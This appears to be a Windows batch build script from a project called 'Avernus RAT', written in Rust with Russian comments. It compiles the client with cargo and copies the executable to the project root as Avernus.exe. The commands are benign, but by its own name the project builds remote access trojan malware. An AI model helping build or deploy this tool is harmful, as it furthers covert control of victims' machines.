@echo off
echo Building Avernus RAT (Rust)...

:: Переходим в папку с Cargo.toml
cd client

:: Сборка
cargo build --release

:: Копируем .exe в корень
copy target\release\avernus_rat_rust.exe ..\Avernus.exe

cd ..

echo [SUCCESS] Build complete! Avernus.exe is in the project root.
pause